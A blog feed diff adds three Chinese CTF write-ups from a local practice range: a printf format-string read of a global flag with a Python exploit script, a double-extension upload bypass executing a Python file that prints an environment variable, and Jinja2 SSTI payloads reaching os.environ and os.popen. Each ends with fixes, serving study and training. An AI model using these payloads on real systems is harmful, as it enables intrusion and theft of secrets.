@@ -4,6 +4,101 @@
   
   
   <entry>
+    <title>range-v1 第 5 题：格式串读全局 flag</title>
+    <link href="/2026/11/28/range-v1-r5-fmt-rce/"/>
+    <url>/2026/11/28/range-v1-r5-fmt-rce/</url>
+    
+    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><code>debian:12-slim</code> + socat，容器内 31337 起 <code>/app/chall</code>，本地 <code>127.0.0.1:12005</code>。编译参数 <code>gcc -O0 -fno-stack-protector -no-pie</code>。</p><p>flag 是全局变量，不是环境变量。<code>nm</code> 能直接看到：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs console"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nm dist/chall | grep <span class="hljs-string">&#x27; flag$&#x27;</span></span><br>0000000000404080 b flag<br></code></pre></td></tr></table></figure><p>漏洞在 <code>printf(line)</code>——格式串由输入控制。</p><h2 id="先确认格式串可控"><a href="#先确认格式串可控" class="headerlink" title="先确认格式串可控"></a>先确认格式串可控</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs console"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;%%p\n&#x27;</span> | nc -q1 127.0.0.1 12005</span><br>=== r5-fmt-rce ===<br>留下你的名字，服务器负责回显：<br>你好，0x7ffce8129350<br></code></pre></td></tr></table></figure><p><code>%p</code> 打出了栈地址，泄漏成立。</p><h2 id="找参数位"><a href="#找参数位" class="headerlink" title="找参数位"></a>找参数位</h2><p>把 <code>Z%02d%N$pZ</code> 逐行发过去，比对小端值，看缓冲区落在参数表第几位：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">matches: [(6, &#x27;你好，Z060x5a7024362536305aZ&#x27;)]<br>sample: [&#x27;你好，Z010x7ffe8d527010Z&#x27;, &#x27;你好，Z02(nil)Z&#x27;, &#x27;你好，Z03(nil)Z&#x27;,<br>         &#x27;你好，Z040x288e82c4Z&#x27;, &#x27;你好，Z05(nil)Z&#x27;, &#x27;你好，Z060x5a7024362536305aZ&#x27;]<br></code></pre></td></tr></table></figure><p>第 6 个参数位就是缓冲区开头的 8 字节。缓冲区偏移 8 处即第 7 位——地址放这里。</p><h2 id="打通"><a href="#打通" class="headerlink" title="打通"></a>打通</h2><p>地址里有 NUL，不能放在前面：<code>printf</code> 会在格式串处就截断。正确姿势是 <code>%7$s</code> 在前，地址接在偏移 8：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs console"><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 - &lt;&lt;<span class="hljs-string">&#x27;PY&#x27;</span></span><br>import socket, struct<br>p = b&quot;%7$sAAAA&quot; + struct.pack(&quot;&lt;Q&quot;, 0x404080)<br>s = socket.create_connection((&quot;127.0.0.1&quot;, 12005)); s.recv(4096)<br>s.sendall(p + b&quot;\n&quot;); print(s.recv(4096).decode(&quot;utf-8&quot;, &quot;replace&quot;))<br>PY<br>你好，flag&#123;range_v1_r5-fmt-rce&#125;AAAA&lt;地址字节&gt;<br></code></pre></td></tr></table></figure><p>平台冒烟：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs console"><span class="hljs-meta prompt_">$ </span><span class="language-bash">toolkit test-challenge ~/ctf/challenges/range-v1/r5-fmt-rce | <span class="hljs-built_in">tail</span> -2</span><br>✓ 端口 182xx 已连通（容器内 31337）<br>✓ 通过：起得来、端口通（未解题验证）<br></code></pre></td></tr></table></figure><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p><strong>musl 打不了这套。</strong> 第一版镜像用 alpine，<code>%p</code> 和 <code>%1$p</code> 打出来都是 <code>0</code>——va_list 初始区没有可用的栈值。同样源码换 glibc 才有泄漏，换成 <code>debian:12-slim</code> 后一次成功。</p><p><strong>alpine 的 gcc 默认 PIE。</strong> <code>readelf -h</code> 显示 <code>DYN</code>，<code>nm</code> 给的 <code>0x4080</code> 不是运行时地址。必须显式 <code>-no-pie</code>，否则得先泄 PIE 基址。</p><p><strong>参数位跟着 libc 版本走。</strong> debian 12 &#x2F; glibc 2.36 实测是 6&#x2F;7，换基础镜像要重新确认 <code>%6$p</code>。</p><p><strong>socat 起的子进程继承容器 env。</strong> 本地 compose 注入 <code>FLAG</code>，GZCTF 上是 <code>GZCTF_FLAG</code>，两边都吃。</p><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><p>格式串可控 + 全局变量 + 没开 PIE，三个条件凑齐就是送分。修法很干脆：别把用户输入当格式串，<code>printf(&quot;%s&quot;, line)</code>。</p><p>真正耗时间的是环境，不是利用——musl 和 PIE 各坑了一次。靶场写题时这两条应该写进模板默认值，省得下一题再踩。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF题解</category>
+      
+      <category>range-v1</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Writeup</tag>
+      
+      <tag>range-v1</tag>
+      
+      <tag>Pwn</tag>
+      
+      <tag>格式化字符串</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>range-v1 第 3 题：双后缀上传绕过，传上去就执行</title>
+    <link href="/2026/11/28/range-v1-r3-upload-bypass/"/>
+    <url>/2026/11/28/range-v1-r3-upload-bypass/</url>
+    
+    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><code>python:3.12-slim</code>，零第三方依赖，容器内 8080，本地 <code>127.0.0.1:12003</code>。镜像里没有 FLAG，flag 走运行时注入。</p><p>漏洞一句话说完：上传校验取<strong>第一个</strong>后缀（白名单 jpg&#x2F;jpeg&#x2F;png&#x2F;gif），插件运行器按<strong>最后一个</strong>后缀 <code>.py</code> 决定 <code>exec</code>。<code>shell.jpg.py</code> 在两边同时成立。</p><h2 id="先摸边界"><a href="#先摸边界" class="headerlink" title="先摸边界"></a>先摸边界</h2><p>探活：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs console"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -o /dev/null -w <span class="hljs-string">&#x27;%&#123;http_code&#125;\n&#x27;</span> http://127.0.0.1:12003/</span><br>200<br></code></pre></td></tr></table></figure><p><code>.py</code> 被拦：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs console"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;print(&quot;hi&quot;)\n&#x27;</span> &gt; /tmp/shell.py</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -F <span class="hljs-string">&#x27;file=@/tmp/shell.py&#x27;</span> http://127.0.0.1:12003/upload</span><br>不允许的类型：.py<br></code></pre></td></tr></table></figure><p><code>.txt</code> 同样被拦：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs console"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;x&#x27;</span> &gt; /tmp/a.txt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -F <span class="hljs-string">&#x27;file=@/tmp/a.txt&#x27;</span> http://127.0.0.1:12003/upload</span><br>不允许的类型：.txt<br></code></pre></td></tr></table></figure><p>合法图片能过：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs console"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;\x89PNGfake&#x27;</span> &gt; /tmp/a.png</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -F <span class="hljs-string">&#x27;file=@/tmp/a.png&#x27;</span> http://127.0.0.1:12003/upload</span><br>saved a.png<br></code></pre></td></tr></table></figure><p>校验认 <code>png</code>，不认内容。</p><h2 id="双后缀"><a href="#双后缀" class="headerlink" title="双后缀"></a>双后缀</h2><p>把两个后缀拼上，首后缀骗过白名单，尾后缀触发执行：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs console"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;import os\nprint(&quot;FLAG=&quot; + os.environ.get(&quot;FLAG&quot;,&quot;&quot;))\n&#x27;</span> &gt; /tmp/shell.jpg.py</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -F <span class="hljs-string">&#x27;file=@/tmp/shell.jpg.py&#x27;</span> http://127.0.0.1:12003/upload</span><br>saved shell.jpg.py<br>FLAG=flag&#123;range_v1_r3-upload-bypass&#125;<br></code></pre></td></tr></table></figure><p>上传接口直接回了 flag——插件是”传完即跑”。</p><p>再走一遍手动执行，确认是文件真的被执行，不是接口顺手回显：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs console"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s http://127.0.0.1:12003/files</span><br>a.png<br>shell.jpg.py<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s <span class="hljs-string">&#x27;http://127.0.0.1:12003/run?name=shell.jpg.py&#x27;</span></span><br>FLAG=flag&#123;range_v1_r3-upload-bypass&#125;<br></code></pre></td></tr></table></figure><p>平台冒烟：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs console"><span class="hljs-meta prompt_">$ </span><span class="language-bash">toolkit test-challenge ~/ctf/challenges/range-v1/r3-upload-bypass | <span class="hljs-built_in">tail</span> -2</span><br>✓ 端口 169xx 已连通（容器内 8080）<br>✓ 通过：起得来、端口通（未解题验证）<br></code></pre></td></tr></table></figure><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p><strong>上传目录不能待在 <code>/app</code>。</strong> 镜像里 <code>COPY src/ /app/</code> 之后切到 <code>USER ctf</code>，<code>/app</code> 归 root，第一次 <code>compose up</code> 直接 <code>PermissionError: &#39;/app/uploads&#39;</code>。把默认改成 <code>/tmp/uploads</code> 才起来。</p><p><strong>手写 multipart 解析有两个细节。</strong> <code>boundary=...</code> 可能带引号；<code>part</code> 末尾的 <code>\r\n</code> 必须剥掉，不然写进去的 payload 尾部多两个字节。</p><p><strong>文件名做了 <code>safe_name()</code> 处理。</strong> <code>/</code>、<code>..</code> 这类会被清掉，所以这题考的是扩展名，不是 traversal——想打路径穿越的可以收手了。</p><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><p>两个组件对”后缀”的理解不一致，白名单就是纸糊的。修法是上传端只认白名单里的<strong>完整</strong>后缀、服务端别拿用户文件名去决定执行方式，运行时按 MIME 或内容识别，且执行目录不可写。</p><p>顺带一句：这题的时间线里最耗时间的不是绕过，是容器起不来。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF题解</category>
+      
+      <category>range-v1</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Writeup</tag>
+      
+      <tag>range-v1</tag>
+      
+      <tag>文件上传</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>range-v1 第 2 题：Jinja2 SSTI 读环境变量</title>
+    <link href="/2026/11/28/range-v1-r2-ssti/"/>
+    <url>/2026/11/28/range-v1-r2-ssti/</url>
+    
+    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><code>python:3.12-slim</code> + <code>jinja2==3.1.4</code>，compose 起在 <code>127.0.0.1:12002</code>。flag 走运行时环境变量注入，app 自己不碰 flag。</p><p>题目用的是<strong>裸 jinja2</strong>，没有 Flask，所以 <code>&#123;&#123;config&#125;&#125;</code> 这类 Flask 专有对象不成立，payload 得走 <code>cycler</code>。</p><h2 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h2><p>先确认模板被渲染：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s --get --data-urlencode <span class="hljs-string">&#x27;name=&#123;&#123;7*7&#125;&#125;&#x27;</span> http://127.0.0.1:12002/hello<br><span class="hljs-comment"># 你好，49！</span><br></code></pre></td></tr></table></figure><h2 id="打通"><a href="#打通" class="headerlink" title="打通"></a>打通</h2><p>默认 <code>Environment</code> 不是沙箱，<code>cycler</code>、<code>lipsum</code> 这些全局对象都在。顺着 <code>__init__.__globals__</code> 就能摸到 <code>os</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s --get --data-urlencode <span class="hljs-string">&#x27;name=&#123;&#123;cycler.__init__.__globals__.os.environ.get(&quot;FLAG&quot;)&#125;&#125;&#x27;</span> \<br>     http://127.0.0.1:12002/hello<br><span class="hljs-comment"># 你好，flag&#123;range_v1_r2-ssti&#125;！</span><br></code></pre></td></tr></table></figure><p>等价写法，走 <code>popen</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;&#123;cycler.__init__.__globals__.os.popen(<span class="hljs-string">&quot;printenv FLAG&quot;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><p>漏洞点两处叠加：用户输入直接拼进 <code>from_string</code> 的模板源码，加上用的是 <code>Environment</code> 而不是 <code>SandboxedEnvironment</code>。</p><p>GZCTF 部署时变量名是 <code>GZCTF_FLAG</code>，payload 里把 <code>FLAG</code> 换掉即可。</p><p>修的话很简单：模板永远参数化渲染（<code>render(name=name)</code>），确实需要动态模板就用 <code>SandboxedEnvironment</code>。</p><p>这个靶场到”读 env”为止，引号&#x2F;下划线过滤绕过、<code>|attr</code> 链、内存马那些留给链外，不在这题的射程里。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF题解</category>
+      
+      <category>range-v1</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Writeup</tag>
+      
+      <tag>SSTI</tag>
+      
+      <tag>range-v1</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>NEPCTF 2026 挂钩都在干什么呢？</title>
     <link href="/2026/07/24/nepctf2026/"/>
     <url>/2026/07/24/nepctf2026/</url>
